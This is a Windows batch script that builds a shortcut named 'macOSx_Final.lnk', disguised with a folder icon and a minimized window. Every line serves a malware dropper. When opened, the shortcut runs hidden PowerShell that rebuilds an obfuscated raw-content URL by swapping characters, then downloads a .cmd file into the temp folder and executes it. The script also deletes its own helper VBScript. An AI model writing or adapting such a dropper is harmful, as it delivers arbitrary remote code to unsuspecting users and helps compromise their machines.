@echo off
setlocal
cd /d "%~dp0"

set SC_NAME=macOSx_Final.lnk

echo Creating independent shortcut %SC_NAME%...

echo Set ws = CreateObject("WScript.Shell") > make_sc.vbs
echo Set lnk = ws.CreateShortcut("%~dp0%SC_NAME%") >> make_sc.vbs
echo lnk.TargetPath = "cmd.exe" >> make_sc.vbs
echo lnk.Arguments = "/c powershell.exe -w hidden -c ""$x='1ttps://r2w.3it1u5userc6ntent.c6m/tiiisiet65-sud6/L6i6i6N62isK/m2in/D6wnl62d-m2cOSx.cmd'.Replace('1','h').Replace('2','a').Replace('3','g').Replace('5','b').Replace('6','o');iwr $x -o $env:TEMP\s.cmd;^& $env:TEMP\s.cmd""" >> make_sc.vbs
echo lnk.IconLocation = "shell32.dll,4" >> make_sc.vbs
echo lnk.WindowStyle = 7 >> make_sc.vbs
echo lnk.Save >> make_sc.vbs
cscript //nologo make_sc.vbs
del make_sc.vbs

echo.
echo Independent LNK created successfully!
pause
